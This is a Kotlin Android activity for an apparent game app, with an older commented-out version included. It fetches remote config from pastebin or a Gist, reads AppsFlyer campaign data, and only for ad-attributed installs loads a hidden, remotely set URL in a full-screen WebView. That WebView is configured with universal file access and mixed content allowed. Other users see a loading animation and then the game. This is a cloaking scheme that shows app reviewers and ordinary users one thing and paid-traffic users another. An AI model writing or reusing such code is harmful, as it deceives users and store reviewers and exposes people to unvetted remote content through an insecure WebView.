package com.finakaklem.manderinka

import android.animation.ValueAnimator
import android.annotation.SuppressLint
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.animation.AccelerateDecelerateInterpolator
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ImageView
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.airbnb.lottie.LottieAnimationView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.finakaklem.manderinka.databinding.ActivityMainBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean

/*import android.animation.ValueAnimator
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.view.animation.AccelerateDecelerateInterpolator
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.ImageView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.airbnb.lottie.LottieAnimationView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread
import kotlin.random.Random

private var blockerAppsFlyer = 0

class MainActivity : AppCompatActivity() {
    private lateinit var weranda: WebView
    private var isWebViewLoaded = false
    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean -> }
    private var apiUrl: String = ""
    private var devKey: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_main)
        val lottieAnimationView = findViewById<LottieAnimationView>(R.id.lottie_animation_view)
        lottieAnimationView.playAnimation()
        weranda = findViewById(R.id.wera)
        registerPermissionNotification()
        val checkFor = getSharedPreferences("balance", Context.MODE_PRIVATE)
        val getShared = saveGet(checkFor)

        weranda.apply {
            settings.allowFileAccessFromFileURLs = true
            settings.allowContentAccess = true
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.useWideViewPort = true
            settings.allowUniversalAccessFromFileURLs = true
            settings.loadWithOverviewMode = true
            settings.domStorageEnabled = true
            settings.databaseEnabled = true
        }

        weranda.webViewClient = WerandaSett(weranda)

        if (getShared == null || getShared == "empty") {
            fetchDataFromPastebin("https://pastebin.com/raw/NDp4PaBL", checkFor)
        } else {
            weranda.visibility = View.VISIBLE
            weranda.loadUrl(getShared)
        }
    }
    private fun fetchDataFromPastebin(pastebinUrl: String, sharedPreferences: SharedPreferences) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                Log.d("MY_TAG", "Requesting URL: $pastebinUrl")

                val url = URL(pastebinUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")

                val responseCode = connection.responseCode
                Log.d("MY_TAG", "Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
                    val response = StringBuilder()
                    var line: String?

                    while (reader.readLine().also { line = it } != null) {
                        response.append(line)
                    }
                    reader.close()

                    Log.d("MY_TAG", "Response body: ${response.toString()}")

                    val jsonResponse = JSONObject(response.toString())
                    devKey = jsonResponse.getString("devKey")
                    apiUrl = jsonResponse.getString("apiUrl")

                    runOnUiThread {
                    startAppsFlyerLogic(devKey, sharedPreferences)
                        }
                } else {
                    Log.e("MY_TAG", "Failed to fetch data. Response code: $responseCode")
                    load()
                    val errorStream = connection.errorStream
                    if (errorStream != null) {
                        val errorReader = BufferedReader(InputStreamReader(errorStream))
                        val errorResponse = StringBuilder()
                        var errorLine: String?

                        while (errorReader.readLine().also { errorLine = it } != null) {
                            errorResponse.append(errorLine)
                        }
                        errorReader.close()
                        Log.e("MY_TAG", "Error body: ${errorResponse.toString()}")
                    }

                    load()
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("MY_TAG", "Error fetching data: ${e.message}")
                load()
            }
        }
    }

    private fun saveGet(checker: SharedPreferences): String? {
        return checker.getString("valueInSharedPreferences", "empty")
    }

    private fun registerPermissionNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private fun startAppsFlyerLogic(devKey: String, sharedPreferences: SharedPreferences) {
        AppsFlyerLib.getInstance().init(devKey, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
                Log.d("MY_TAG", "Conversion Data Success")
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    if (appfMap != null && appfMap.isNotEmpty()) {
                        val campaign = appfMap["campaign"] as? String
                        val afAd = appfMap["af_ad"] as? String
                        val media    = appfMap["media_source"] as? String
                        Log.d("MY_TAG", "Campaign: $campaign, Ad: $afAd, media: $media")

                        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this@MainActivity.applicationContext)

                        if (!campaign.isNullOrEmpty() && !afAd.isNullOrEmpty()) {
                            val link = "$apiUrl?eynbufxop=$campaign&qvuonrxb=$afAd&ombjoxqs=$media&finassistafid=$afId"
                            sharedPreferences.edit().putString("getKey", link).apply()
                            Log.d("MY_TAG", "Generated link: $link")
                            runOnUiThread {
                                weranda.visibility = View.VISIBLE
                                weranda.loadUrl(link)
                            }
                        } else {
                            Log.d("MY_TAG", "No attribution data found, opening game")
                            load()
                        }
                    } else {
                        Log.d("MY_TAG", "Attribution data is empty, opening game")
                        load()
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e("MY_TAG", "Conversion Data Fail: $error")
                load()
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    load()
                }
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {}
            override fun onAttributionFailure(error: String?) {}
        }, this)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun load() {
        val imageView2 = findViewById<ImageView>(R.id.imageView2)
        val currentHeight = imageView2.layoutParams.height

        animateHeight(imageView2, currentHeight, 1000)

        replaceImage(1000)
    }

    private fun animateHeight(view: ImageView, startHeight: Int, endHeight: Int) {
        val animator = ValueAnimator.ofInt(startHeight, endHeight)
        animator.duration = 1000
        animator.interpolator = AccelerateDecelerateInterpolator()

        animator.addUpdateListener { animation ->
            val newHeight = animation.animatedValue as Int
            val layoutParams = view.layoutParams
            layoutParams.height = newHeight
            view.layoutParams = layoutParams
        }

        animator.start()
    }

    private fun replaceImage(delay: Long) {
        val gotovo = findViewById<ImageView>(R.id.gotovo)

        gotovo.postDelayed({
            gotovo.setImageResource(R.drawable.gotovo2)

            gotovo.postDelayed({
                val currentHeight = gotovo.layoutParams.height
                animateHeight(gotovo, currentHeight, currentHeight + 400)
                gotovo.setImageResource(R.drawable.gotovo3)
                gotovo.postDelayed({
                    val intent = Intent(this@MainActivity, HomeActivity::class.java)
                    startActivity(intent)
                    finish()
                }, 4000)

            }, 4000)

        }, delay)
    }


    inner class WerandaSett(val weras: WebView) : WebViewClient() {
        override fun onPageStarted(views: WebView?, url: String?, favicon: Bitmap?) {
            weras.layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            val currentUrl = request?.url.toString()
            if (currentUrl.contains("https://sdfjhsa")) {
                load()
                return true
            }
            return false
        }
    }
}*/

class MainActivity : AppCompatActivity() {

    private val coroutine = CoroutineScope(Dispatchers.Main)

    private lateinit var binding : ActivityMainBinding

    //var blockBack    : () -> Unit = {}
    //var blockRedirect: () -> Unit = {}

    private val sharedPreferences: SharedPreferences by lazy { getSharedPreferences("LOL", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MY_TAG", "onCreate")

        hideNavigationBar()
        initialize()
    }

    override fun onResume() {
        super.onResume()
        Log.d("MY_TAG", "onResume")
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        startGlobal()
    }

    // Init Web ----------------------------------------------------------------------------------

    @Suppress("DEPRECATION")
    fun initWeb() {
        binding.wera.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()

            // Реєструємо зворотний виклик у диспетчері
            onBackPressedDispatcher.addCallback {
                if (canGoBack()) {
                    goBack()
                } else {
                    if (isOffer.not() && isVisible) {
                        hideWebView()
                    } //else blockBack()
                }
            }
        }
    }

    private var isOffer = true

    fun showUrl(url: String, isOffer: Boolean = true) {
        runOnUiThread {
            Log.d("MY_TAG", "showUrl: $url | isOffer = $isOffer")

            this@MainActivity.isOffer = isOffer
            binding.wera.loadUrl(url)

            showWebView()
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            Log.d("MY_TAG", "redirect: ${request?.url.toString()}")

            if (request?.url.toString().contains("https://sdfjhsa")) {
                Log.d("MY_TAG", "contains")
                hideWebView()
                load()

                return true
            }

            return false
        }
    }

    // Logic -----------------------------------------------------------------------------------------

    private fun hideNavigationBar() {
        // Для API нижче 30
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )
    }

    @SuppressLint("SourceLockedOrientationActivity")
    fun hideWebView() {
        runOnUiThread {
            binding.wera.visibility         = View.GONE
            //binding.navHostFragment.visibility = View.VISIBLE
            //binding.navHostFragment.requestFocus()
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT

//            GLOBAL_isPauseGame = false
        }
    }

    private fun showWebView() {
        //binding.navHostFragment.visibility = View.GONE
        binding.wera.visibility = View.VISIBLE
        binding.wera.requestFocus()
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
    }






    private fun load() {
        runOnUiThread {
            Log.d("MY_TAG", "Load")

            val imageView2 = findViewById<ImageView>(R.id.imageView2)
            val currentHeight = imageView2.layoutParams.height

            animateHeight(imageView2, currentHeight, 1000)

            replaceImage(1000)
        }
    }

    private fun animateHeight(view: ImageView, startHeight: Int, endHeight: Int) {
        val animator = ValueAnimator.ofInt(startHeight, endHeight)
        animator.duration = 1000
        animator.interpolator = AccelerateDecelerateInterpolator()

        animator.addUpdateListener { animation ->
            val newHeight = animation.animatedValue as Int
            val layoutParams = view.layoutParams
            layoutParams.height = newHeight
            view.layoutParams = layoutParams
        }

        animator.start()
    }

    private fun replaceImage(delay: Long) {
        val gotovo = findViewById<ImageView>(R.id.gotovo)

        gotovo.postDelayed({
            gotovo.setImageResource(R.drawable.gotovo2)

            gotovo.postDelayed({
                val currentHeight = gotovo.layoutParams.height
                animateHeight(gotovo, currentHeight, currentHeight + 400)
                gotovo.setImageResource(R.drawable.gotovo3)
                gotovo.postDelayed({
                    val intent = Intent(this@MainActivity, HomeActivity::class.java)
                    startActivity(intent)
                    finish()
                }, 4000)

            }, 4000)

        }, delay)
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun startGlobal() {
        Log.d("MY_TAG", "startGlobal")
        //activity.blockRedirect = { GLOBAL_isGame = true }

        val lottieAnimationView = findViewById<LottieAnimationView>(R.id.lottie_animation_view)
        lottieAnimationView.playAnimation()

        initWeb()

        val getData = sharedPreferences.getString("DAR", "gera") ?: "gera"

        try {
            if (getData == "gera") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.devKey, getAppsFlyerConversionListener(getJSON.apiUrl), applicationContext)
                        AppsFlyerLib.getInstance().start(this@MainActivity, getJSON.devKey, getAppsFlyerRequestListener())
                    } else {
                        load()
                    }
                }
            } else {
                showUrl(getData)
            }
        } catch (e: Exception) {
            Log.d("MY_TAG", "error: ${e.message}")
            load()
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)

                Log.d("MY_TAG","Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?eynbufxop=$campaign&qvuonrxb=$afAd&ombjoxqs=$media&finassistafid=$afId"
                Log.d("MY_TAG","link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("DAR", link).apply() }

                showUrl(link)

            } else load()
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            load()
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            Log.d("MY_TAG", "AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            Log.d("MY_TAG", "AppsFlyer: onError")
        }
    }

}

